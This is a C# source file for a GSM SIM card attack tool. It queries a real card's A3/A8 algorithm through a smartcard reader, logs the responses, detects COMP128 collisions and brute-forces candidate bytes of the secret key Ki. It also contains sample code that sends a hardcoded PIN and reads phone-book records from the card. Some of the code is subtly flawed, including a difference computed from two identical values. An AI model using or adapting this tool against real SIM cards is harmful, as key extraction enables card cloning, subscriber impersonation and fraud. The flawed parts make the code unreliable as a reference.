using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using GemCard;
using System.Threading;
using System.Diagnostics;

namespace SIMEmu
{
    interface IComp128Impl
    {
        bool A38(byte[] Rand, byte[] Result);
    }


    class Comp128Cracker
    {
        IComp128Impl comp128;
        #region Byte packing routines
        private uint Pack4Bytes(byte a, byte b, byte c, byte d)
        {
            return ((uint)a) | ((uint)b << 8) | ((uint)c << 16) | ((uint)d << 24);
        }
        private void Unpack4Bytes(uint l, ref byte a, ref byte b, ref byte c, ref byte d)
        {
            a = (byte)l;
            b = (byte)(l >> 8);
            c = (byte)(l >> 16);
            d = (byte)(l >> 24);
        }
        private ulong Pack8Bytes(byte[] a)
        {
            ulong r = 0;
            for (int i = 0; i < 8; i++) r = (r << 8) | a[i];
            return r;
        }
        private void Unpack8Bytes(ulong l, byte[] a)
        {
            for (int i = 0; i < 8; i++)
            {
                a[7 - i] = (byte)l;
                l >>= 8;
            }
        }
        #endregion
        private FileStream session;
        private byte[] Rand;
        private int kid;
        private byte[] start_pos;
        private Random rng;
        private Dictionary<ulong, uint> hashes;
        private Comp128Cracker() { }
        public Comp128Cracker(IComp128Impl c) 
        { 
            comp128 = c;
            rng = new Random();

            Rand = new byte[16];
            start_pos = new byte[4];
            kid = 1;
            hashes = new Dictionary<ulong, uint>();
        }
        public bool InitNewSession(string sessionfile)
        {
            try
            {
                session = new FileStream(sessionfile, FileMode.CreateNew);
                rng.NextBytes(Rand);
                for (int i = 0; i < start_pos.Length; i++) start_pos[i] = 0;
                session.Write(Rand, 0, Rand.Length);
                session.WriteByte((byte)kid);
                return true;
            }
            catch (System.Exception)
            {
                return false;
            }
        }
        public bool RestoreSession(string sessionfile)
        {
            session = new FileStream(sessionfile, FileMode.Open);
            session.Seek(0, SeekOrigin.Begin);
            session.Read(Rand, 0, Rand.Length);
            kid = session.ReadByte(); 
            int data_len = (int)(session.Length - session.Position);
            Debug.Assert(data_len % 16 == 0);
            byte[] b = new byte[16];
            //Pick up a random hash and recompute it to verify the integrity of the session file.
            int verify_index = rng.Next(data_len / 16);
            for (int i = 0; i < data_len / 16; i++)
            {
                session.Read(b, 0, 16);
                ulong k = Pack8Bytes(b); //0..11 Result
                uint v = Pack4Bytes(b[12], b[13], b[14], b[15]); //12..15 Rand[kid+(0,4,8,12)]
                hashes[k] = v;
                if (i == verify_index)
                {
                    byte[] r = (byte[])Rand.Clone();
                    byte[] rr = new byte[12];
                    for(int j=0;j<4;j++) r[kid+4*j] = b[12 + j];
                    if (!comp128.A38(r, rr))
                        return false;
                    bool mismatch = false;
                    for (int j = 0; j < rr.Length; j++) if (rr[j] != b[j]) mismatch = true;
                    if (mismatch)
                    {
                        Console.WriteLine("ERR: Session file does NOT match SIM!");
                        return false;
                    }
                    else
                        Console.WriteLine("OK: Session file matches SIM.");
                }
            }
            for (int i = 0; i < 4; i++)
                start_pos[i] = b[12+i];
            IncrementStartPos();
            return true;
        }
        private void IncrementStartPos()
        {
            Unpack4Bytes(Pack4Bytes(start_pos[0], start_pos[2], start_pos[1], start_pos[3]) + 1,
                ref start_pos[0], ref start_pos[2], ref start_pos[1], ref start_pos[3]);
        }
        private volatile bool stopping;
        private Thread worker;
        public void Start()
        {
            stopping = false;
            worker = new Thread(Collect);
            worker.Start();
        }
        public void Stop()
        {
            stopping = true;
            worker.Join();
            session.Close();
        }

        private long Get3RCollisionProbability(long R0, long R1)
        {
            long p = 1;
            for (int i = 0; i < 8; i++)
            {
                int r0 = (int)(R0 & 0x3F); R0 >>= 6;
                int r1 = (int)(R1 & 0x3F); R1 >>= 6;
                if (r0 == r1) //Collision at 3R gives 100% contribution
                {
                    p *= (1 << 6);
                    continue;
                }
                int denom = 0;
                for (int r2 = 0; r2 < (1 << 6); r2++)
                {
                    int t0 = r0, t1 = r1, t0_ = r2, t1_ = r2;
                    Comp128.swap(ref t0, ref t0_, 3);
                    Comp128.swap(ref t1, ref t1_, 3);
                    if ((t0 == t1) && (t0_ == t1_)) denom++;
                }
                if (denom == 0) return 0;
                p *= denom ;
            }
            return p;
        }
        public void Solve3RCollision(uint R0, uint R1)
        {
            Console.WriteLine("Searching key pair using 3R collision.");
            Comp128 c = new Comp128();
            byte r0_0 = 0, r4_0 = 0, r8_0 = 0, r12_0 = 0, r0_1 = 0, r4_1 = 0, r8_1 = 0, r12_1 = 0;
            Unpack4Bytes(R0, ref r0_0, ref r4_0, ref r8_0, ref r12_0);
            Unpack4Bytes(R1, ref r0_1, ref r4_1, ref r8_1, ref r12_1);

            //Sort all possible K0 K8 pair in ascending order of their 2R's hamming distance and try in that order.
            List<KeyValuePair<int, int>> K08 = new List<KeyValuePair<int, int>>();
            for (int k0 = 0; k0 <= 0xFF; k0++)
                for (int k8 = 0; k8 <= 0xFF; k8++)
                    K08.Add(new KeyValuePair<int, int>((k0 << 8) | k8, Comp128.Compute2R(k0, k8, r0_0, r8_0) ^ Comp128.Compute2R(k0, k8, r0_1, r8_1)));
            K08.Sort(new IntComparer<KeyValuePair<int, int>>(v => HammingDistance.long_hamming(v.Value)));

            foreach (var k08 in K08)
            {
                int k0 = (k08.Key >> 8) & 0xFF;
                int k8 = (k08.Key >> 0) & 0xFF;
                int candidate_keys = 0;
                //SOrt K4 K12 in ascending order of 3R
                List<KeyValuePair<int, long>> K412 = new List<KeyValuePair<int, long>>();
                for (int k4 = 0; k4 <= 0xFF; k4++)
                    for (int k12 = 0; k12 <= 0xFF; k12++)
                        K412.Add(new KeyValuePair<int, long>((k4 << 8) | k12,
                            Comp128.Compute3R(k0, k4, k8, k12, r0_0, r4_0, r8_0, r12_0) ^
                            Comp128.Compute3R(k0, k4, k8, k12, r0_0, r4_0, r8_0, r12_0)
                            ));
                K412.Sort(new IntComparer<KeyValuePair<int, long>>(v => HammingDistance.long_hamming(v.Value)));

                //Find probability of 3R/4R collisions of every quadruple Ri
                List<KeyValuePair<int, long>> K412P = new List<KeyValuePair<int, long>>();
                foreach (var k412 in K412)
                {
                    int k4 = (k412.Key >> 8) & 0xFF;
                    int k12 = (k412.Key >> 0) & 0xFF;
                    long ThreeR0 = Comp128.Compute3R(k0, k4, k8, k12, r0_0, r4_0, r8_0, r12_0);
                    long ThreeR1 = Comp128.Compute3R(k0, k4, k8, k12, r0_1, r4_1, r8_1, r12_1);
                    long diff = ThreeR0 ^ ThreeR1;
                    if (HammingDistance.long_hamming(diff) > 2) continue;
                    long p = Get3RCollisionProbability(ThreeR0, ThreeR1);
                    if (p == 0) continue;
                    K412P.Add(new KeyValuePair<int, long>((k4 << 8) | k12, p));
                }
                //Output quadruple Ri in descending probabilities of 3R/4R collision
                K412P.Sort((x, y) => x.Value.CompareTo(y.Value));
                foreach (var k412p in K412P)
                {
                    int k4 = (k412p.Key >> 8) & 0xFF;
                    int k12 = (k412p.Key >> 0) & 0xFF;
                    Console.WriteLine(String.Format("Computed Key: {0:x2} {1:x2} {2:x2} {3:x2} with p = {4:F2}%",
                        new object[] { k0, k4, k8, k12, k412p.Value * 100.0 / ((long)1<<48) }));
                    candidate_keys++;
                }
                if (candidate_keys > 0)
                    Console.WriteLine(String.Format("Found {0} possible keys.", candidate_keys));
            }
        }
        public void Collect()
        {
            long t0, t;
            t0 = t = System.Environment.TickCount;
            int c0 = hashes.Count;

            byte[] r = new byte[12];
            Console.WriteLine();
            while (!stopping)
            {
                if (System.Environment.TickCount - t > 250)
                {
                    t = System.Environment.TickCount;
                    Console.Write(String.Format("\rObtained {0:d8} hashes. Speed: {1:F2} op/sec", 
                        hashes.Count, (hashes.Count - c0)/((t - t0) / 1000.0))
                        );
                }
                for (int i = 0; i < 4;i++)
                    Rand[kid + 4 * i] = start_pos[i];

                if (!comp128.A38(Rand, r)) break;
                
                ulong k = Pack8Bytes(r);
                uint v = Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]);
                if (!hashes.ContainsKey(k))
                    hashes[k] = v;
                else
                {
                    Console.WriteLine();
                    Console.WriteLine(String.Format("Collision detected after {0} steps.", hashes.Count));
                    Solve3RCollision(hashes[k], Pack4Bytes(start_pos[0], start_pos[1], start_pos[2], start_pos[3]));
                    break;
                }
                session.Write(r, 0, r.Length);
                for (int i = 0; i < 4; i++) session.WriteByte(start_pos[i]);
                session.Flush();

                IncrementStartPos();
            }
        }
    }


    class SIMInterface : IComp128Impl
    {
        private APDUCommand
            apduVerifyCHV = new APDUCommand(0xA0, 0x20, 0, 1, null, 0),
            apduRunGSM = new APDUCommand(0xA0, 0x88, 0, 0, null, 0),
            apduSelectFile = new APDUCommand(0xA0, 0xA4, 0, 0, null, 0),
            apduReadRecord = new APDUCommand(0xA0, 0xB2, 1, 4, null, 0),
            apduGetResponse = new APDUCommand(0xA0, 0xC0, 0, 0, null, 0);

        const ushort SC_OK = 0x9000;
        const byte SC_PENDING = 0x9F;

        private CardNative iCard;
        private bool DFgsm_selected; 
        public SIMInterface()
        {
            iCard = new CardNative();

            string[] readers = iCard.ListReaders();
            Console.WriteLine("Please insert card into the reader and press any key...");
            Console.ReadKey(true);

            iCard.Connect(readers[0], SHARE.Shared, PROTOCOL.T0orT1);
            Console.WriteLine("Connects card on reader: " + readers[0]);
            DFgsm_selected = false;
        }

        public void Disconnect()
        {
            try
            {
                iCard.Disconnect(DISCONNECT.Unpower);
            }
            catch (Exception){}
        }

        ~SIMInterface() { Disconnect(); }

        #region Example Code
        /// <summary>
        /// This program tests the API with a SIM card. 
        /// If your PIN is activated be careful when presenting the PIN to your card! 
        /// </summary>
        public void Test()
        {
            try
            {
                DFgsm_selected = false;
                APDUResponse apduResp;
                APDUParam apduParam = new APDUParam();

                // Verify the PIN (if necessary)
                byte[] pin = new byte[] { 0x31, 0x32, 0x33, 0x34, 0xFF, 0xFF, 0xFF, 0xFF };
                apduParam.Data = pin;
                apduVerifyCHV.Update(apduParam);
                apduResp = iCard.Transmit(apduVerifyCHV);
                // Select the MF (3F00)
                apduParam.Data = new byte[] { 0x3F, 0x00 };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("MF selected");

                // Select the EFtelecom (7F10)
                apduParam.Data = new byte[] { 0x7F, 0x10 };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("DFtelecom selected");

                // Select the EFadn (6F3A)
                apduParam.Data = new byte[] { 0x6F, 0x3A };
                apduSelectFile.Update(apduParam);
                apduResp = iCard.Transmit(apduSelectFile);
                if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                    throw new Exception("Select command failed: " + apduResp.ToString());
                Console.WriteLine("EFadn (Phone numbers) selected");

                // Read the response
                if (apduResp.SW1 == SC_PENDING)
                {
                    apduParam.Reset();
                    apduParam.Le = apduResp.SW2;
                    apduParam.Data = null;
                    apduGetResponse.Update(apduParam);
                    apduResp = iCard.Transmit(apduGetResponse);
                    if (apduResp.Status != SC_OK)
                        throw new Exception("Select command failed: " + apduResp.ToString());
                }

                // Get the length of the record
                int recordLength = apduResp.Data[14];

                Console.WriteLine("Reading the Phone number 10 first entries");
                // Read the 10 first record of the file
                for (int nI = 0; nI < 10; nI++)
                {
                    apduParam.Reset();
                    apduParam.Le = (byte) recordLength;
                    apduParam.P1 = (byte) (nI + 1);
                    apduReadRecord.Update(apduParam);
                    apduResp = iCard.Transmit(apduReadRecord);

                    if (apduResp.Status != SC_OK)
                        throw new Exception("ReadRecord command failed: " + apduResp.ToString());

                    Console.WriteLine("Record #" + ((int) (nI + 1)).ToString());
                    Console.WriteLine(apduResp.ToString());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
                #endregion

        #region IComp128Impl Members

        public void SelectDFGsm()
        {
            APDUResponse apduResp;
            APDUParam apduParam = new APDUParam();

            // Select the DF_GSM (7F20)
            apduParam.Data = new byte[] { 0x7F, 0x20 };
            apduSelectFile.Update(apduParam);
            apduResp = iCard.Transmit(apduSelectFile);
            if (apduResp.Status != SC_OK && apduResp.SW1 != SC_PENDING)
                throw new Exception("Select command failed: " + apduResp.ToString());
            Console.WriteLine("DFgsm selected");
            DFgsm_selected = true;
        }
        public bool A38(byte[] Rand, byte[] Result)
        {
            Debug.Assert(Rand.Length == 16);
            try
            {
                if (!DFgsm_selected) SelectDFGsm();

                APDUResponse apduResp;
                APDUParam apduParam = new APDUParam();

                //Execute A38 Algorithm
                apduParam.Data = (byte[])Rand.Clone();
                apduRunGSM.Update(apduParam);
                apduResp = iCard.Transmit(apduRunGSM);
                if (apduResp.SW1 != SC_PENDING)
                    throw new Exception("RunGSM: " + apduResp.ToString());

                apduParam.Reset();
                apduParam.Le = apduResp.SW2;
                apduParam.Data = null;
                apduGetResponse.Update(apduParam);
                apduResp = iCard.Transmit(apduGetResponse);
                if (apduResp.Status != SC_OK)
                    throw new Exception("Get GSM result failed: " + apduResp.ToString());
                //Console.Write("GSM Result: ");
                //for (int i = 0; i < apduResp.Data.Length; i++)
                //    Console.Write(String.Format("{0:X2}", apduResp.Data[i]));
                //Console.WriteLine();
                apduResp.Data.CopyTo(Result, 0);
                return true;
                }
            catch (System.Exception ex)
            {
                Console.WriteLine("SIM Run_GSM exception: " + ex.ToString());
                return false;
            }
        }

        #endregion
    }
}
